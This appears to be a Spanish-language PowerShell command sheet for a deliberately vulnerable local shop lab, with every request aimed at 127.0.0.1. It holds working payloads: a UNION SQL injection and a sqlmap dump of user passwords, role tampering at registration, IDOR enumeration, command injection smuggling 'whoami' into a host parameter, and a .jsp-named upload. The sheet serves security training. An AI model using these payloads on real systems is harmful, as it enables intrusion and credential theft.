# Comandos PowerShell — Tienda Insegura v1

Todos los comandos apuntan exclusivamente a `127.0.0.1`.

## 1. Levantar el laboratorio

```powershell
Set-Location C:\ruta\tienda-insegura
docker compose --profile full up -d --build
docker compose ps
```

## 2. Verificar servicios

```powershell
Invoke-RestMethod http://127.0.0.1:8080/actuator/health
Invoke-RestMethod http://127.0.0.1:8080/api/productos
Invoke-WebRequest http://127.0.0.1:3000 -Method Head
```

## 3. Login y token

```powershell
$body = @{
    username = "jperez"
    password = "password1"
} | ConvertTo-Json

$resp = Invoke-RestMethod `
    -Uri "http://127.0.0.1:8080/api/auth/login" `
    -Method Post `
    -ContentType "application/json" `
    -Body $body

$token = $resp.data.token
```

## 4. Registro con rol manipulado

```powershell
$registro = @{
    username = "labadmin"
    email = "labadmin@local.test"
    password = "Lab123"
    fullName = "Lab Admin"
    role = "ADMIN"
} | ConvertTo-Json

Invoke-RestMethod `
    -Uri "http://127.0.0.1:8080/api/auth/registro" `
    -Method Post `
    -ContentType "application/json" `
    -Body $registro
```

## 5. Acceso administrativo

```powershell
Invoke-RestMethod `
    -Uri "http://127.0.0.1:8080/api/admin/usuarios" `
    -Headers @{ Authorization = "Bearer $token" } |
    ConvertTo-Json -Depth 6
```

## 6. SQL Injection manual

```powershell
$payload = "x%') UNION SELECT id,username,password,0::numeric,0,NULL FROM usuarios -- "
$encoded = [System.Uri]::EscapeDataString($payload)

Invoke-RestMethod `
    -Uri "http://127.0.0.1:8080/api/productos/buscar?q=$encoded" |
    ConvertTo-Json -Depth 6
```

## 7. sqlmap

```powershell
.\pentesting\sqlmap\run-sqlmap.ps1
```

O manualmente:

```powershell
sqlmap `
  -u "http://127.0.0.1:8080/api/productos/buscar?q=test" `
  -p q --batch -D tienda_insegura -T usuarios `
  -C username,password,role --dump
```

## 8. IDOR

```powershell
1..3 | ForEach-Object {
    try {
        Invoke-RestMethod `
          -Uri "http://127.0.0.1:8080/api/pedidos/$_" `
          -Headers @{ Authorization = "Bearer $token" } |
          ConvertTo-Json -Depth 6
    } catch {
        Write-Host "Pedido $_ no disponible"
    }
}
```

## 9. Command Injection controlado

```powershell
$hostPayload = [System.Uri]::EscapeDataString("127.0.0.1;whoami")
Invoke-RestMethod `
  -Uri "http://127.0.0.1:8080/api/admin/reportes/ping?host=$hostPayload"
```

Si el backend se ejecuta directamente sobre Windows, usar `&` codificado:

```powershell
$hostPayload = [System.Uri]::EscapeDataString("127.0.0.1&whoami")
Invoke-RestMethod `
  -Uri "http://127.0.0.1:8080/api/admin/reportes/ping?host=$hostPayload"
```

## 10. Actuator y CORS

```powershell
Invoke-RestMethod http://127.0.0.1:8080/actuator/env |
  ConvertTo-Json -Depth 8

(Invoke-WebRequest `
  -Uri "http://127.0.0.1:8080/api/productos" `
  -Headers @{ Origin = "http://sitio-no-confiable.invalid" }).Headers
```

## 11. Upload inseguro con archivo inocuo

PowerShell 7:

```powershell
"archivo de prueba" | Set-Content .\evidencia.txt
Invoke-RestMethod `
  -Uri "http://127.0.0.1:8080/api/productos/1/imagen" `
  -Method Post `
  -Form @{ archivo = Get-Item .\evidencia.txt }
```

Alternativa con `curl.exe`:

```powershell
curl.exe -X POST `
  "http://127.0.0.1:8080/api/productos/1/imagen" `
  -F "archivo=@evidencia.txt;filename=evidencia.jsp"
```

## 12. Logs

```powershell
docker compose logs -f backend
```

## 13. Detener y limpiar

```powershell
docker compose --profile full down
```

```powershell
docker compose --profile full down -v
```

